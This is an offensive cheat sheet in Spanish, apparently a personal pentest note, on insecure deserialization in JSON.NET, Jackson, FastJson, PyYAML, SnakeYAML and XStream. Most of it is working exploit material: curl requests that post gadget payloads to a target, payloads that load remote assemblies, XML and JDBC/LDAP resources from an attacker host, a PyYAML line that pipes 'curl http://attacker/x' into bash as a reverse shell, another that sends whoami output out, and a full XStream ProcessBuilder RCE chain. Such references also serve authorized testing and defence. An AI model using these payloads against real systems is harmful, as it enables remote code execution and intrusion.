---
aliases:
  - JSON Polymorphic
  - YAML Eval
  - XML Deserialization
  - Jackson
  - JSON.NET TypeNameHandling
  - FastJson
tags:
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Insecure Deserialization]]"
---
# Insecure Deserialization - Formatos Estructurados

---

## JSON Polymorphic

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/json" -d '{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}' https://target/api/x` | Newtonsoft.Json TypeNameHandling abuse — instancia tipos arbitrarios | TypeNameHandling=All/Auto/Objects. |
| `curl -X POST -H "Content-Type: application/json" -d '{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker/evil.dll"}' https://target/api/x` | RCE via remote assembly load | JSON.NET con TypeNameHandling. |
| `curl -X POST -d '["org.springframework.context.support.ClassPathXmlApplicationContext","http://attacker/spel.xml"]' https://target/api/x` | Jackson polymorphic RCE via XML context load | Default typing o `@JsonTypeInfo`. |
| `curl -X POST -d '["com.zaxxer.hikari.HikariConfig",{"metricRegistry":"jdbc:mysql:..."}]' https://target/api/x` | Jackson HikariConfig JDBC RCE | Jackson + HikariCP. |
| `curl -X POST -d '["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:..."}]' https://target/api/x` | Jackson Logback JDBC RCE | Jackson + Logback. |
| `curl -X POST -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/evil","autoCommit":true}' https://target/api/x` | FastJson 1.2.x JdbcRowSetImpl RCE | Alibaba FastJson clásico. |
| `curl -X POST -d '{"@type":"L<class>;"}' https://target/api/x` (formato referencia Java) | FastJson reference bypass class blacklist | Blacklist sobre class name. |
| `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` y POST resultado | Generate JSON.NET payload con tool | Newtonsoft TypeNameHandling. |
^deser-fmt-json

### JSON.NET vulnerable config

```csharp
// VULNERABLE — TypeNameHandling != None
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
};
var obj = JsonConvert.DeserializeObject(userInput, settings);
```

### Workflow exploit JSON.NET

```bash
# Generar payload con ysoserial.net
ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"

# Resultado: JSON con $type que ejecuta calc.exe al deser
```

---

## YAML Eval

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `!!python/object/apply:os.system ["id"]` | PyYAML `yaml.load()` (sin Loader) | Pre-PyYAML 5.1 = RCE inmediato. |
| PyYAML moderno (con Loader=yaml.Loader) | Mismo payload — Loader unsafe = RCE. | Solo `SafeLoader` está safe. |
| `!!python/object/new:type ["x", !!python/tuple [], {"extend": !!python/name:exec}]` | PyYAML `python/object/new` | Bypass de filtros básicos. |
| `!!python/object/apply:subprocess.check_output [["id"]]` | PyYAML object/apply subprocess | RCE via subprocess. |
| `!!python/object/apply:os.system ["curl http://attacker/x \| bash"]` | PyYAML `os.system` clásico | Reverse shell. |
| Ruby YAML.load (CVE-2013-0156) | Universal gadget — ver `Insecure Deserialization - Object Injection`. | Rails. |
| `--- !ruby/object:Gem::Requirement requirements: ...` | Ruby YAML.load Psych < 3.1 | Hashicorp / Rails legacy. |
| `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` | SnakeYAML (Java) | Carga JAR remoto. |
| SnakeYAML CVE-2022-1471 | Versions < 1.33 default Constructor unsafe. | Spring apps típicas. |
| `!System.Diagnostics.Process` con StartInfo | YAML.NET (.NET) | Si UseUnsafeMode habilitado. |
| `!!python/object/apply:builtins.eval ["__import__('os').system('id')"]` | RemoteCodeExec via PyYAML | eval-based bypass. |
^deser-fmt-yaml

### Payload PyYAML completo

```yaml
!!python/object/apply:os.system
- "curl http://attacker.com/$(whoami)"
```

```python
import yaml

payload = '''!!python/object/apply:os.system
- "id > /tmp/pwned"
'''

# Vulnerable
yaml.load(payload, Loader=yaml.Loader)  # RCE

# Safe
yaml.safe_load(payload)  # Raises ConstructorError
```

---

## XML Deserialization

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<map><entry><java.beans.EventHandler>...</java.beans.EventHandler></entry></map>` | XStream (Java) — clásico | EventHandler-based RCE. |
| XStream CVE-2021-39139 | Decenas de gadgets — JdkDynamicAggregateTranslator, etc. | Versiones < 1.4.18. |
| XStream con `xstream.fromXML(input)` | Sink primario | Equivalente a readObject pero XML. |
| .NET XmlSerializer | Solo vulnerable si tipos arbitrarios + KnownTypes habilitado | Más restrictivo. |
| .NET DataContractSerializer | Vulnerable si KnownTypes incluye System.* | NetDataContract más laxo. |
| .NET NetDataContractSerializer | Vulnerable like BinaryFormatter | Incluye type metadata. |
| .NET LosFormatter | ViewState legacy | Mismo riesgo que BinaryFormatter. |
| SOAPFormatter | Otra alternativa .NET vulnerable | Histórico. |
| `<ObjectDataProvider ObjectType="System.Diagnostics.Process" MethodName="Start">...</ObjectDataProvider>` | XAML payload (.NET WPF/PresentationFramework) | Con NetDataContractSerializer / XamlReader. |
| Castor XML (Java) | Vulnerable como XStream | Menos común. |
| MarshalSec (Apache Commons) | Tool similar a ysoserial pero para XML/JSON deser | Ver `Insecure Deserialization - Tooling`. |
^deser-fmt-xml

### XStream RCE clásico

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command><string>id</string></command>
                    </next>
                  </iter>
                </serviceIterator>
              </cipher>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
  </entry>
</map>
```

(Generar con `marshalsec` para versiones específicas.)

---
